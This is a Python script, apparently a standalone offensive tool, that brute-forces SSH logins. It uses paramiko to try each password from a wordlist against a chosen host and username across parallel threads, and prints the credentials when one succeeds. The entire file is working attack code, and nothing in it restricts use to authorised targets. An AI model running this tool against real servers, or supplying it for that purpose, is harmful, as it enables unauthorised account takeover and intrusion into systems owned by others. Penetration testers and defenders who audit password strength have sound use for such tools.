import paramiko
from termcolor import colored
import argparse
import concurrent.futures
from threading import Event
from wordlists import chunk_wordlist


def connect_to_ssh(target_host, ssh_port, username, password, event, show_attempts):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_host, port=ssh_port, username=username, password=password)
        print(colored(("[+] Found password: {}".format(password)), 'light_green'))
        print(colored(("[++] SSH Credentials: {}:{}".format(username,password)), 'blue'))
        event.set()
    except paramiko.ssh_exception.AuthenticationException:
        if not event.is_set() and show_attempts:
            print(colored(("[-] Incorrect password: {}".format(password)), 'light_red'))
    
    except paramiko.ssh_exception.BadAuthenticationType:
        print(colored("[--] The host doesn't appear to allow password based authentication", 'red'))
        event.set()
    
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(colored("[--] Unable to connect to SSH service on the specified port", 'red'))
        event.set()

    except paramiko.ssh_exception.BadHostKeyException:
        print(colored("[--] The SSH server on the target has returned an unexpected host key", 'red'))
        event.set()
    ssh.close()


def brute_force_ssh(target_host, ssh_port, username, wordlist_chunk, event, show_attempts):
    for password in wordlist_chunk:
        if not event.is_set():
            connect_to_ssh(target_host, ssh_port, username, password[0], event, show_attempts)
         

def main():
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("target_host", help="Specify target host", type=str)
    parser.add_argument("-p", default=22, dest="ssh_port", help="SSH server port", type=int)
    parser.add_argument('-u', dest='username', help='Username', type=str, required=True)
    parser.add_argument('-w', dest='wordlist', help='Wordlist with passwords', type=str, required=True)
    parser.add_argument('-t', dest='threads', help='Number of concurrent connections', type=int, default=4)
    parser.add_argument('-a', dest='show_attempts', help='Show all attempted logins', default=False, action='store_true')
    args = parser.parse_args()

    all_wordlist_chunks = chunk_wordlist(args.wordlist, args.threads)
    finished = Event()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for wordlist_chunk in all_wordlist_chunks:
            executor.submit(brute_force_ssh, args.target_host, args.ssh_port, args.username, wordlist_chunk, finished, args.show_attempts)




if __name__ == '__main__':
	main()

